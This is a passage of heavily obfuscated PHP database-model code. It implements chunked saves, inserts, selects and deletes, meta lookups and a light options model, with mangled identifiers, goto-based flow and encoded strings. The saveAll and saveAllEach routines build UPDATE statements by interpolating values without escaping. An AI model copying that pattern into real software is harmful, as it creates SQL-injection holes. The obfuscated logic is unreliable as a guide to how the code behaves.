$f¿Åï„Ê¨->where(array($cĞñ¼‘§à => $C…–¢æµ¤…))->delete(); } if (is_null($aìö‚ÙÙŠ) && is_string($C¹ª§ÂŸó)) { return $f¿Åï„Ê¨->where($CÅ¦ù¹É›)->delete(); } $B‰Ç¼Ì‚‡Ù = is_array($C¹ª§ÂŸó) ? $C¹ª§ÂŸó : array(); goto FÆ¼×Áá¨; FÕŠõÛõ†¹: $CÑõ˜ÔëåŠ = $this->tableMeta[$C¾˜ß±ÏË[369]]; $f¿Åï„Ê¨ = Model($CÑõ˜ÔëåŠ); $CÅ¦ù¹É› = array($cĞñ¼‘§à => $C…–¢æµ¤…, $C¾˜ß±ÏË[370] => $C¹ª§ÂŸó); goto a¶îÕâ¿„¯; CÀ´Àëò: $C¾˜ß±ÏË =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->tableMeta || !$C…–¢æµ¤…) { return !1; } $cĞñ¼‘§à = $this->tableMeta[$C¾˜ß±ÏË[368]]; goto FÕŠõÛõ†¹; aø†·øòñÙ: CacheLock::unlock($F‹Íš§ˆ); return !0; goto DÃÊÙØñˆ‡; FÆ¼×Áá¨: if (is_string($C¹ª§ÂŸó)) { $B‰Ç¼Ì‚‡Ù[$C¹ª§ÂŸó] = $aìö‚ÙÙŠ; } $c‚“ìÕœÊ = array(); foreach ($B‰Ç¼Ì‚‡Ù as $a…Ø÷á™µ‘ => $E¾­â–ëÖÉ) { $this->checkLength($E¾­â–ëÖÉ, !1, $CÑõ˜ÔëåŠ . $C¾˜ß±ÏË[4] . $a…Ø÷á™µ‘); $c‚“ìÕœÊ[] = array($cĞñ¼‘§à => $C…–¢æµ¤…, $C¾˜ß±ÏË[93] => $a…Ø÷á™µ‘, $C¾˜ß±ÏË[371] => $E¾­â–ëÖÉ); } goto E–Ÿù¬à; DÃÊÙØñˆ‡: } public function metaGet($B‡ê““¹¢æ, $c¼õÜ˜±¢ = false) { goto c®¥Œßà©‰; eê®À‰‚Úª: $d•Û·ï‹Óº = Model($this->tableMeta[$cçÇšİ·™˜[369]]); if ($c¼õÜ˜±¢) { $fôƒ§ÎÓÉ = array($dÂÆÏ©à => $B‡ê““¹¢æ, $cçÇšİ·™˜[93] => $c¼õÜ˜±¢); return $d•Û·ï‹Óº->where($fôƒ§ÎÓÉ)->getField($cçÇšİ·™˜[371]); } $fôƒ§ÎÓÉ = array($dÂÆÏ©à => $B‡ê““¹¢æ); goto eš¸ËñµİØ; c®¥Œßà©‰: $cçÇšİ·™˜ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->tableMeta) { return array(); } $dÂÆÏ©à = $this->tableMeta[$cçÇšİ·™˜[368]]; goto eê®À‰‚Úª; eš¸ËñµİØ: $F¹í©ã‰ë = $d•Û·ï‹Óº->field($cçÇšİ·™˜[373])->where($fôƒ§ÎÓÉ)->select(); $F¹í©ã‰ë = array_to_keyvalue($F¹í©ã‰ë, $cçÇšİ·™˜[93], $cçÇšİ·™˜[371]); return $F¹í©ã‰ë; goto cŠå´æå§ò; cŠå´æå§ò: } private function checkDataAutoHas($B—£•Ÿß) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $e¯¿Âñ©İ) { if (in_array($B—£•Ÿß, explode($_SERVER[Ïº«‚ßèÔˆø][47], $e¯¿Âñ©İ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$BÇÅùÄ¿ë¹, $CÒ´Æ‘Şè) { $c‡äÛŒ“ºŠ =& $_SERVER[Ïº«‚ßèÔˆø]; foreach ($this->dataAuto as $e¡ĞÀÓĞâ) { $dÑÔøµ â” = $e¡ĞÀÓĞâ[0]; if (!in_array($CÒ´Æ‘Şè, explode($c‡äÛŒ“ºŠ[47], $e¡ĞÀÓĞâ[2]))) { continue; } switch (trim($e¡ĞÀÓĞâ[3])) { case $c‡äÛŒ“ºŠ[318]: case $c‡äÛŒ“ºŠ[319]: $DŠåÈŠ¼› = $e¡ĞÀÓĞâ[1]; $fÊÛ´œñÑË = isset($e¡ĞÀÓĞâ[4]) ? (array) $e¡ĞÀÓĞâ[4] : array(); if ($DŠåÈŠ¼› == $c‡äÛŒ“ºŠ[196] && array_key_exists($dÑÔøµ â”, $BÇÅùÄ¿ë¹)) { if (!$BÇÅùÄ¿ë¹[$dÑÔøµ â”]) { unset($BÇÅùÄ¿ë¹[$dÑÔøµ â”]); } break; } if (isset($BÇÅùÄ¿ë¹[$dÑÔøµ â”])) { array_unshift($fÊÛ´œñÑË, $BÇÅùÄ¿ë¹[$dÑÔøµ â”]); } if ($c‡äÛŒ“ºŠ[318] == $e¡ĞÀÓĞâ[3]) { $BÇÅùÄ¿ë¹[$dÑÔøµ â”] = call_user_func_array($DŠåÈŠ¼›, $fÊÛ´œñÑË); } else { $BÇÅùÄ¿ë¹[$dÑÔøµ â”] = call_user_func_array(array(&$this, $DŠåÈŠ¼›), $fÊÛ´œñÑË); } break; case $c‡äÛŒ“ºŠ[270]: $BÇÅùÄ¿ë¹[$dÑÔøµ â”] = $BÇÅùÄ¿ë¹[$e¡ĞÀÓĞâ[1]]; break; case $c‡äÛŒ“ºŠ[291]: if (isset($BÇÅùÄ¿ë¹[$dÑÔøµ â”]) && !is_string($BÇÅùÄ¿ë¹[$dÑÔøµ â”])) { $BÇÅùÄ¿ë¹[$dÑÔøµ â”] = json_encode_force($BÇÅùÄ¿ë¹[$dÑÔøµ â”]); } break; case $c‡äÛŒ“ºŠ[320]: if ($BÇÅùÄ¿ë¹[$dÑÔøµ â”] === $c‡äÛŒ“ºŠ[33]) { unset($BÇÅùÄ¿ë¹[$dÑÔøµ â”]); } break; case $c‡äÛŒ“ºŠ[321]: $BÇÅùÄ¿ë¹[$dÑÔøµ â”] = $e¡ĞÀÓĞâ[1]; default: break; } } if ($CÒ´Æ‘Şè == $c‡äÛŒ“ºŠ[354]) { $dÜÇÆ‰ÚÁ˜ = strtolower($this->db->getDbType()); if (strpos($dÜÇÆ‰ÚÁ˜, $c‡äÛŒ“ºŠ[9]) !== 0) { return; } $f¾™’Ñ¹ = $this->field(!0)->fields; $E­¶ê‡İó‘ = $f¾™’Ñ¹[$c‡äÛŒ“ºŠ[249]]; if (isset($f¾™’Ñ¹[$c‡äÛŒ“ºŠ[248]])) { unset($E­¶ê‡İó‘[$f¾™’Ñ¹[$c‡äÛŒ“ºŠ[248]]]); } foreach ($E­¶ê‡İó‘ as $b¢â±•·„ => $CÒ´Æ‘Şè) { if (!isset($BÇÅùÄ¿ë¹[$b¢â±•·„])) { $BÇÅùÄ¿ë¹[$b¢â±•·„] = $c‡äÛŒ“ºŠ[33]; } } } } private function dataAfterFilter(&$FÜ “˜ğ“˜) { $Bà×´‰¨‰è =& $_SERVER[Ïº«‚ßèÔˆø]; foreach ($this->dataAuto as $EÃÍœ‹·¿) { $eºƒºÔìÓ¥ = $EÃÍœ‹·¿[0]; if (!in_array($Bà×´‰¨‰è[356], explode($Bà×´‰¨‰è[47], $EÃÍœ‹·¿[2]))) { continue; } if (!isset($FÜ “˜ğ“˜[$eºƒºÔìÓ¥])) { continue; } switch (trim($EÃÍœ‹·¿[3])) { case $Bà×´‰¨‰è[318]: case $Bà×´‰¨‰è[319]: $AŒá›Õ¢Î = isset($EÃÍœ‹·¿[4]) ? (array) $EÃÍœ‹·¿[4] : array(); array_unshift($AŒá›Õ¢Î, $FÜ “˜ğ“˜[$eºƒºÔìÓ¥]); if ($Bà×´‰¨‰è[318] == $EÃÍœ‹·¿[3]) { $FÜ “˜ğ“˜[$eºƒºÔìÓ¥] = call_user_func_array($EÃÍœ‹·¿[1], $AŒá›Õ¢Î); } else { $FÜ “˜ğ“˜[$eºƒºÔìÓ¥] = call_user_func_array(array(&$this, $EÃÍœ‹·¿[1]), $AŒá›Õ¢Î); } break; case $Bà×´‰¨‰è[270]: $FÜ “˜ğ“˜[$eºƒºÔìÓ¥] = $FÜ “˜ğ“˜[$EÃÍœ‹·¿[1]]; break; case $Bà×´‰¨‰è[291]: $e©Ãè¢Â§± = $FÜ “˜ğ“˜[$eºƒºÔìÓ¥]; $FÜ “˜ğ“˜[$eºƒºÔìÓ¥] = json_decode($e©Ãè¢Â§±, !0); if (is_null($FÜ “˜ğ“˜[$eºƒºÔìÓ¥])) { $FÜ “˜ğ“˜[$eºƒºÔìÓ¥] = $e©Ãè¢Â§±; } break; case $Bà×´‰¨‰è[320]: if ($FÜ “˜ğ“˜[$eºƒºÔìÓ¥] === $Bà×´‰¨‰è[33]) { unset($FÜ “˜ğ“˜[$eºƒºÔìÓ¥]); } break; case $Bà×´‰¨‰è[321]: $FÜ “˜ğ“˜[$eºƒºÔìÓ¥] = $EÃÍœ‹·¿[1]; default: break; } } } public function saveAll($E•¢ËØºÂÙ) { goto BÂ¬˜…Úá·; eî‰ƒĞÛêà: $this->chunkEventSet(); goto dŒÍ¦¦…å—; f“¦ğóˆ´²: $E•¢ËØºÂÙ = is_array($E•¢ËØºÂÙ) ? $E•¢ËØºÂÙ : array(); $fìŸÉï—… = $BœÆ¼ÖŞÅ[374]; $CÑ…ˆˆ»ÜÃ = 0; goto e¹ÅØè¥Á; BÂ¬˜…Úá·: $BœÆ¼ÖŞÅ =& $_SERVER[Ïº«‚ßèÔˆø]; $bå„ÆÂ¤î = $this->tablePrefix . $this->tableName; $aĞ£ä¢í·Æ = self::SQL_WHERE_IN_CHUNK; goto f“¦ğóˆ´²; e¹ÅØè¥Á: $d—òÈ¨Èƒƒ = array(); $CªÊÖÁÀÇ = count($E•¢ËØºÂÙ); for ($cÜµ‚ÖÍ³ = 0; $cÜµ‚ÖÍ³ < $CªÊÖÁÀÇ; $cÜµ‚ÖÍ³++) { $bÑãÈÛ‚½¡ = $E•¢ËØºÂÙ[$cÜµ‚ÖÍ³]; if (!is_array($bÑãÈÛ‚½¡) || count($bÑãÈÛ‚½¡) != 4) { continue; } $c÷Ù‘ÌŒ°µ = "\125\x50\x44\x41\x54\x45\40\140{$bå„ÆÂ¤î}\140\40\123\105\x54\x20{$bÑãÈÛ‚½¡[2]}\40\x3d\x20\x43\101\123\x45\x20{$bÑãÈÛ‚½¡[0]}\40\xa"; if ($CÑ…ˆˆ»ÜÃ == 0) { $fìŸÉï—… = $c÷Ù‘ÌŒ°µ; } $d—òÈ¨Èƒƒ[] = $BœÆ¼ÖŞÅ[116] . $bÑãÈÛ‚½¡[1] . $BœÆ¼ÖŞÅ[116]; $CÑ…ˆˆ»ÜÃ++; $fìŸÉï—… .= "\x20\x57\110\105\116\40\x27{$bÑãÈÛ‚½¡[1]}\x27\x20\x54\110\x45\116\x20\x27{$bÑãÈÛ‚½¡[3]}\x27\x20\xa"; if ($CÑ…ˆˆ»ÜÃ == $aĞ£ä¢í·Æ || $cÜµ‚ÖÍ³ == $CªÊÖÁÀÇ - 1) { goto DóÂöñà³À; CœîÛô¢¢Ñ: $CÑ…ˆˆ»ÜÃ = 0; $fìŸÉï—… = $c÷Ù‘ÌŒ°µ; $this->chunkEventCheck(count($d—òÈ¨Èƒƒ)); goto A½Ïóƒ¥ßØ; DóÂöñà³À: $Cáä¯ùŒ„ = implode($BœÆ¼ÖŞÅ[47], $d—òÈ¨Èƒƒ); $fìŸÉï—… .= "\40\x45\116\104\x20\40\127\x48\x45\x52\105\x20{$bÑãÈÛ‚½¡[0]}\x20\111\116\x20\x28{$Cáä¯ùŒ„}\x29\x20"; $this->execute($fìŸÉï—…); goto CœîÛô¢¢Ñ; A½Ïóƒ¥ßØ: $d—òÈ¨Èƒƒ = array(); goto eöÜï©ç„¨; eöÜï©ç„¨: } } goto eî‰ƒĞÛêà; dŒÍ¦¦…å—: } public function saveAllEach($f°Î­Ö•³Œ) { $aÆáêœÒë =& $_SERVER[Ïº«‚ßèÔˆø]; $F²¯‘åïÎŒ = $this->tablePrefix . $this->tableName; foreach ($f°Î­Ö•³Œ as $AÄîÙˆÏğË) { if (!is_array($AÄîÙˆÏğË) || count($AÄîÙˆÏğË) != 4) { continue; } $cÜˆÎ¿Öõâ = $AÄîÙˆÏğË[0] . $aÆáêœÒë[375] . $AÄîÙˆÏğË[1] . $aÆáêœÒë[116]; $BÕÎê¥ô¿ = $AÄîÙˆÏğË[2] . $aÆáêœÒë[375] . $AÄîÙˆÏğË[3] . $aÆáêœÒë[116]; $cÓƒ¡ÑßØ™ = "\165\x70\x64\141\x74\145\x20{$F²¯‘åïÎŒ}\40\163\145\164\40{$BÕÎê¥ô¿}\40\x77\150\145\x72\145\40{$cÜˆÎ¿Öõâ}\73"; $this->execute($cÓƒ¡ÑßØ™); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Dá¿Æå†ƒá = false, $dÈæ­¼ßëµ = false) { $this->_chunkEvent = $Dá¿Æå†ƒá; $this->_chunkEventParam = $dÈæ­¼ßëµ; } private function chunkEventCheck($dÑÄøÇ£”Û) { if (!$this->_chunkEvent) { return; } $aœºòŸåÚ¼ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $aœºòŸåÚ¼[$_SERVER[Ïº«‚ßèÔˆø][376]] = $dÑÄøÇ£”Û; Hook::trigger($this->_chunkEvent, $aœºòŸåÚ¼); } public function addAll($aÆÉµø ‘, $CõõÑÌ‡ƒ = array(), $dÇ…ğğ‘˜½ = false) { goto a˜Òé¯ö†³; a˜Òé¯ö†³: $fñ¡ë¦×Æ =& $_SERVER[Ïº«‚ßèÔˆø]; ignore_timeout(); $Eì¡ø©ï¬ç = self::SQL_WHERE_IN_CHUNK; goto aáÏÑî¢; aáÏÑî¢: if (empty($aÆÉµø ‘)) { $this->error = think_lang($fñ¡ë¦×Æ[268]); return !1; } $CõõÑÌ‡ƒ = $this->_parseOptions($CõõÑÌ‡ƒ); foreach ($aÆÉµø ‘ as $d ª½ãäÒŸ => $Aª–¶òÒ¨Í) { $aÆÉµø ‘[$d ª½ãäÒŸ] = $this->_facade($Aª–¶òÒ¨Í); $this->_beforeInsert($aÆÉµø ‘[$d ª½ãäÒŸ], $CõõÑÌ‡ƒ); } goto fÔŒ¨¢åÂø; fÔŒ¨¢åÂø: if (method_exists($this->db, $fñ¡ë¦×Æ[269])) { for ($C®‡§•–ñË = 0; $C®‡§•–ñË < count($aÆÉµø ‘); $C®‡§•–ñË += $Eì¡ø©ï¬ç) { $Eòõ„ÄèÃ› = array_slice($aÆÉµø ‘, $C®‡§•–ñË, $Eì¡ø©ï¬ç); if (!is_array($Eòõ„ÄèÃ›) || count($Eòõ„ÄèÃ›) == 0) { break; } $d‹òƒà×„« = $this->db->insertAll($Eòõ„ÄèÃ›, $CõõÑÌ‡ƒ, $dÇ…ğğ‘˜½); $this->chunkEventCheck(count($Eòõ„ÄèÃ›)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($aÆÉµø ‘ as $d ª½ãäÒŸ => $Aª–¶òÒ¨Í) { $d‹òƒà×„« = $this->db->insert($Aª–¶òÒ¨Í, $CõõÑÌ‡ƒ, $dÇ…ğğ‘˜½); } $this->commit(); } if (!1 !== $d‹òƒà×„«) { $fÓé×¥Ê‘ = $this->getLastInsID(); if ($fÓé×¥Ê‘) { return $fÓé×¥Ê‘; } } return $d‹òƒà×„«; goto DÎ©±Ï¥ˆ; DÎ©±Ï¥ˆ: } public function save($bâÔâ¶«ğ = '', $B·ê˜„¢ = array()) { goto d‡™Á¨®¹; bÔï“¾Ä‡š: $B—±†¼ƒ‡ = $this->findWhereField($a–¹âŸ®“); if (!$B—±†¼ƒ‡) { return parent::save($bâÔâ¶«ğ, $B·ê˜„¢); } $A‡ì¹İÕ×– = 0; goto aÉ••ùÅ‚Ç; d‡™Á¨®¹: $c¹Ç…à†Í‰ =& $_SERVER[Ïº«‚ßèÔˆø]; $A°İæÄÑè = self::SQL_WHERE_IN_CHUNK; $a–¹âŸ®“ = $this->optionsValue(); goto bÔï“¾Ä‡š; CÍ÷™°—°: for ($Cù‡„¹ÛÎ“ = 0; $Cù‡„¹ÛÎ“ < $aÓ¶×Óˆäœ; $Cù‡„¹ÛÎ“ += $A°İæÄÑè) { $aƒìÔŸ•òÛ = array_slice($EŞÅó·ÉÛ, $Cù‡„¹ÛÎ“, $A°İæÄÑè); if (!is_array($aƒìÔŸ•òÛ) || count($aƒìÔŸ•òÛ) == 0) { break; } $a–¹âŸ®“[$c¹Ç…à†Í‰[272]][$B—±†¼ƒ‡][1] = $aƒìÔŸ•òÛ; $this->optionsValue($a–¹âŸ®“); $A‡ì¹İÕ×– += parent::save($bâÔâ¶«ğ, $B·ê˜„¢); $this->chunkEventCheck(count($aƒìÔŸ•òÛ)); } $this->chunkEventSet(); return $A‡ì¹İÕ×–; goto D‚ù¯×­é…; aÉ••ùÅ‚Ç: $EŞÅó·ÉÛ = $a–¹âŸ®“[$c¹Ç…à†Í‰[272]][$B—±†¼ƒ‡][1]; $EŞÅó·ÉÛ = is_array($EŞÅó·ÉÛ) ? $EŞÅó·ÉÛ : array(); $aÓ¶×Óˆäœ = count($EŞÅó·ÉÛ); goto CÍ÷™°—°; D‚ù¯×­é…: } public function add($b®Éšìœ‚ = '', $b¼­ÕñÙ É = array(), $Aºó›¬˜Æ” = false) { if ($this->addTaskStatus && is_array($b®Éšìœ‚)) { $this->addTaskData[] = $b®Éšìœ‚; return; } return parent::add($b®Éšìœ‚, $b¼­ÕñÙ É, $Aºó›¬˜Æ”); } public function parseWhereLike($a‡¢—Æ²‚œ, $eôÀßÎ¾°³ = '', $e‚˜«Œï˜š = false, &$d°´Ü¢³æÍ = false) { goto A˜ó‡Ï£ÇÔ; D§Ú–éëÄ›: if (!is_array($a‡¢—Æ²‚œ)) { return $a‡¢—Æ²‚œ; } $c¼ƒÉ‘Šæ = array(); $D÷è¼ÇŠÍÄ = 0; goto A”‡‹§Û¥Õ; A˜ó‡Ï£ÇÔ: $a¡îÃ»”í· =& $_SERVER[Ïº«‚ßèÔˆø]; $CÔ£øŠĞ‚© = $GLOBALS[$a¡îÃ»”í·[6]][$a¡îÃ»”í·[377]]; if (!$CÔ£øŠĞ‚©[$a¡îÃ»”í·[378]]) { return $a‡¢—Æ²‚œ; } goto D§Ú–éëÄ›; A”‡‹§Û¥Õ: foreach ($a‡¢—Æ²‚œ as $dµ£Ú‰ŠÃ => $cÌğ£‹òÀ•) { if (is_array($cÌğ£‹òÀ•) && count($cÌğ£‹òÀ•) == 2 && $cÌğ£‹òÀ•[0] == $a¡îÃ»”í·[379] && is_string($cÌğ£‹òÀ•[1]) && substr($cÌğ£‹òÀ•[1], 0, 1) == $a¡îÃ»”í·[380] && substr($cÌğ£‹òÀ•[1], strlen($cÌğ£‹òÀ•[1]) - 1, 1) == $a¡îÃ»”í·[380]) { goto fÍÚ©ùô½è; e²±­ÈğóÇ: if ($CÔ£øŠĞ‚©[$a¡îÃ»”í·[382]]) { $E„›÷¯˜¹ = $a¡îÃ»”í·[383] . $B›äËØí‘æ . $a¡îÃ»”í·[384]; if ($CÔ£øŠĞ‚©[$a¡îÃ»”í·[385]]) { $E„›÷¯˜¹ = $a¡îÃ»”í·[384] . $B›äËØí‘æ . $a¡îÃ»”í·[383]; } } $c¼ƒÉ‘Šæ[$D÷è¼ÇŠÍÄ] = $a¡îÃ»”í·[386] . $Dôå÷‹‰Š . $a¡îÃ»”í·[387] . $E„›÷¯˜¹ . $a¡îÃ»”í·[388]; $D÷è¼ÇŠÍÄ++; goto A«õß’¦Ö; A«õß’¦Ö: continue; goto dÏâ½Î‚; fĞÔ…‚–: $B›äËØí‘æ = $this->db->escapeString($B›äËØí‘æ); if (!strpos($Dôå÷‹‰Š, $a¡îÃ»”í·[95])) { $Dôå÷‹‰Š = $a¡îÃ»”í·[381] . $Dôå÷‹‰Š . $a¡îÃ»”í·[381]; } $E„›÷¯˜¹ = $a¡îÃ»”í·[182] . $B›äËØí‘æ . $a¡îÃ»”í·[182]; goto e²±­ÈğóÇ; fÍÚ©ùô½è: $d°´Ü¢³æÍ = !0; $Dôå÷‹‰Š = is_string($dµ£Ú‰ŠÃ) ? $dµ£Ú‰ŠÃ : $eôÀßÎ¾°³; $B›äËØí‘æ = substr($cÌğ£‹òÀ•[1], 1, strlen($cÌğ£‹òÀ•[1]) - 2); goto fĞÔ…‚–; dÏâ½Î‚: } if (is_array($cÌğ£‹òÀ•)) { $eôÀßÎ¾°³ = is_string($dµ£Ú‰ŠÃ) ? $dµ£Ú‰ŠÃ : $eôÀßÎ¾°³; $cÌğ£‹òÀ• = $this->parseWhereLike($cÌğ£‹òÀ•, $eôÀßÎ¾°³, !0, $d°´Ü¢³æÍ); } if (is_numeric($dµ£Ú‰ŠÃ)) { $c¼ƒÉ‘Šæ[$D÷è¼ÇŠÍÄ] = $cÌğ£‹òÀ•; $D÷è¼ÇŠÍÄ++; } else { $c¼ƒÉ‘Šæ[$dµ£Ú‰ŠÃ] = $cÌğ£‹òÀ•; } } if ($d°´Ü¢³æÍ && !$e‚˜«Œï˜š) { } return $c¼ƒÉ‘Šæ; goto Bé°à‰òïÉ; Bé°à‰òïÉ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($cÔÅ´í›‰É = array()) { goto FÛ¿„¡®Ğï; D²ÕÜ–Š: $DéÉ„ÅíÀ÷ = $this->findWhereField($BÊŠ—»ë÷); if (!$DéÉ„ÅíÀ÷ || isset($BÊŠ—»ë÷[$F±™íòñ«Œ[289]]) || isset($BÊŠ—»ë÷[$F±™íòñ«Œ[350]])) { return parent::select($cÔÅ´í›‰É); } $a‰ĞšËÏ  = $BÊŠ—»ë÷[$F±™íòñ«Œ[272]][$DéÉ„ÅíÀ÷][1]; goto aËğÀ¹Ò›¢; FÛ¿„¡®Ğï: $F±™íòñ«Œ =& $_SERVER[Ïº«‚ßèÔˆø]; $Cğ²¢ĞÀ×” = self::SQL_WHERE_IN_CHUNK; $BÊŠ—»ë÷ = $this->optionsValue(); goto D²ÕÜ–Š; Aòœ«‰óçª: return $DÆ”Û¹óô; goto d‹’âãã¹…; aËğÀ¹Ò›¢: $a‰ĞšËÏ  = is_array($a‰ĞšËÏ ) ? $a‰ĞšËÏ  : array(); $DÆ”Û¹óô = null; for ($Cô›ô»©ñÅ = 0; $Cô›ô»©ñÅ < count($a‰ĞšËÏ ); $Cô›ô»©ñÅ += $Cğ²¢ĞÀ×”) { $cƒ‰…ŒÆµ = array_slice($a‰ĞšËÏ , $Cô›ô»©ñÅ, $Cğ²¢ĞÀ×”); if (!is_array($cƒ‰…ŒÆµ) || count($cƒ‰…ŒÆµ) == 0) { break; } $BÊŠ—»ë÷[$F±™íòñ«Œ[272]][$DéÉ„ÅíÀ÷][1] = $cƒ‰…ŒÆµ; $this->optionsValue($BÊŠ—»ë÷); $FØ»¯•¬Ô = parent::select($cÔÅ´í›‰É); if (!$FØ»¯•¬Ô) { continue; } $DÆ”Û¹óô = is_array($DÆ”Û¹óô) ? $DÆ”Û¹óô : array(); $DÆ”Û¹óô = array_merge($DÆ”Û¹óô, $FØ»¯•¬Ô); } goto Aòœ«‰óçª; d‹’âãã¹…: } public function delete($aáÌëáÆ¤Ç = array()) { goto A‘Í¹èÍÍĞ; A‘Í¹èÍÍĞ: $Aø¼÷¨Åë =& $_SERVER[Ïº«‚ßèÔˆø]; $FÇŠ à¨×™ = self::SQL_WHERE_IN_CHUNK; $AÜÀˆ†Îƒ = $this->optionsValue(); goto eÂÜ§–âù²; eÂÜ§–âù²: $DÖÈë¨…°‰ = $this->findWhereField($AÜÀˆ†Îƒ); if (!$DÖÈë¨…°‰) { return parent::delete($aáÌëáÆ¤Ç); } $AóÈ²Ã¦ˆ = 0; goto b™ë–óªè‚; eÂØ¥‡‹Ñö: return $AóÈ²Ã¦ˆ; goto EÌõÒƒË; b™ë–óªè‚: $Fàãòñ¿âì = $AÜÀˆ†Îƒ[$Aø¼÷¨Åë[272]][$DÖÈë¨…°‰][1]; $Fàãòñ¿âì = is_array($Fàãòñ¿âì) ? $Fàãòñ¿âì : array(); for ($Aê¦œ®ª†Ü = 0; $Aê¦œ®ª†Ü < count($Fàãòñ¿âì); $Aê¦œ®ª†Ü += $FÇŠ à¨×™) { $c²­›óæ¸ = array_slice($Fàãòñ¿âì, $Aê¦œ®ª†Ü, $FÇŠ à¨×™); if (!is_array($c²­›óæ¸) || count($c²­›óæ¸) == 0) { break; } $AÜÀˆ†Îƒ[$Aø¼÷¨Åë[272]][$DÖÈë¨…°‰][1] = $c²­›óæ¸; $this->optionsValue($AÜÀˆ†Îƒ); $AóÈ²Ã¦ˆ += parent::delete($aáÌëáÆ¤Ç); } goto eÂØ¥‡‹Ñö; EÌõÒƒË: } private function findWhereField($aèùß³ºŒ) { $f±åğÒõœ =& $_SERVER[Ïº«‚ßèÔˆø]; $F´Ç‘×Ñ¶¤ = self::SQL_WHERE_IN_CHUNK; if (!is_array($aèùß³ºŒ) || !is_array($aèùß³ºŒ[$f±åğÒõœ[272]])) { return !1; } foreach ($aèùß³ºŒ[$f±åğÒõœ[272]] as $Dì³Í¸Î‡Ş => $AœÂò£¢ÏÜ) { if (is_array($AœÂò£¢ÏÜ) && isset($AœÂò£¢ÏÜ[0]) && is_string($AœÂò£¢ÏÜ[0]) && strtolower($AœÂò£¢ÏÜ[0]) == $f±åğÒõœ[7] && is_array($AœÂò£¢ÏÜ[1]) && count($AœÂò£¢ÏÜ[1]) > $F´Ç‘×Ñ¶¤) { ignore_timeout(); return $Dì³Í¸Î‡Ş; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\145\155\117\160\x74\151\157\x6e"; public $field = array(); public function listData($DÂ¡º ÁÜ° = false, $bé”÷à¬§ = "\x6d\x6f\x64\151\x66\171\x54\151\x6d\145", $f”Ó›Ñ°† = false) { $dôê¢±ËÁƒ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$dôê¢±ËÁƒ) { return $DÂ¡º ÁÜ° ? null : array(); } if (!$DÂ¡º ÁÜ°) { $dôê¢±ËÁƒ = array_filter(array_values($dôê¢±ËÁƒ)); return array_sort_by($dôê¢±ËÁƒ, $bé”÷à¬§, $f”Ó›Ñ°†); } return $dôê¢±ËÁƒ[$_SERVER[Ïº«‚ßèÔˆø][389] . $DÂ¡º ÁÜ°]; } public function insert($Cßòõæù) { goto fˆò›äá½ö; fˆò›äá½ö: $a¬¿òãÕÂŠ =& $_SERVER[Ïº«‚ßèÔˆø]; $Cßòõæù = array_field_key($Cßòõæù, $this->field); $bÊĞ«á²øê = Model($this->modelType)->get($a¬¿òãÕÂŠ[390], $this->optionType . $a¬¿òãÕÂŠ[391]); goto cˆøîƒ½’ò; cˆøîƒ½’ò: $bÊĞ«á²øê = $bÊĞ«á²øê ? $bÊĞ«á²øê : 0; $Cßòõæù[$a¬¿òãÕÂŠ[392]] = ++$bÊĞ«á²øê; $Cßòõæù[$a¬¿òãÕÂŠ[193]] = time(); goto Cˆ¥†œ—¦; Fñ„Ò´‡ö: return $bÊĞ«á²øê; goto bÜ¸Ó‰¦¦¢; Cˆ¥†œ—¦: $Cßòõæù[$a¬¿òãÕÂŠ[84]] = time(); Model($this->modelType)->set($a¬¿òãÕÂŠ[390], $bÊĞ«á²øê, $this->optionType . $a¬¿òãÕÂŠ[391]); Model($this->modelType)->set($a¬¿òãÕÂŠ[389] . $bÊĞ«á²øê, $Cßòõæù, $this->optionType); goto Fñ„Ò´‡ö; bÜ¸Ó‰¦¦¢: } public function update($A¥·ß…ğ»®, $CÜ‡î‹º¿) { goto bê„ª„Ó…æ; aŸ …»¶: if (!$FÖ§Üìäİë) { return !1; } $CÜ‡î‹º¿ = array_merge($FÖ§Üìäİë, $CÜ‡î‹º¿); $CÜ‡î‹º¿[$f¿­Şä™¢á[84]] = time(); goto BìÇ†‘–ª…; bê„ª„Ó…æ: $f¿­Şä™¢á =& $_SERVER[Ïº«‚ßèÔˆø]; $CÜ‡î‹º¿ = array_field_key($CÜ‡î‹º¿, $this->field); $FÖ§Üìäİë = $this->listData($A¥·ß…ğ»®); goto aŸ …»¶; BìÇ†‘–ª…: return Model($this->modelType)->set($f¿­Şä™¢á[389] . $A¥·ß…ğ»®, $CÜ‡î‹º¿, $this->optionType); goto cáİ÷³ö‘; cáİ÷³ö‘: } public function remove($e™„ßš¯“Ö) { return Model($this->modelType)->remove($_SERVER[Ïº«‚ßèÔˆø][389] . $e™„ßš¯“Ö, $this->optionType); } public function clear() { $A¢ÓàŸèÌ =& $_SERVER[Ïº«‚ßèÔˆø]; Model($this->modelType)->remove($A¢ÓàŸèÌ[390], $this->optionType . $A¢ÓàŸèÌ[391]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($aî²¸÷Õ»º, $cŠï“¾„Æ) { if (!$cŠï“¾„Æ) { return !1; } $bÛèÍ™¾ø¡ = $this->listData(); $bÛèÍ™¾ø¡ = array_to_keyvalue($bÛèÍ™¾ø¡, $aî²¸÷Õ»º); return isset($bÛèÍ™¾ø¡[$cŠï“¾„Æ]) ? $bÛèÍ™¾ø¡[$cŠï“¾„Æ] : !1; } public function findByName($d³­‰ßéÆ) { return $this->findByKey($_SERVER[Ïº«‚ßèÔˆø][28], $d³­‰ßéÆ); } protected function resetData($aìÀÙºÏÁ£) { $cÀ’¦Şé =& $_SERVER[Ïº«‚ßèÔˆø]; $aìÀÙºÏÁ£ = is_array($aìÀÙºÏÁ£) ? $aìÀÙºÏÁ£ : array(); $c¯“ÛŒâ‘Ñ = array(); for ($FÍÙğœê = 0; 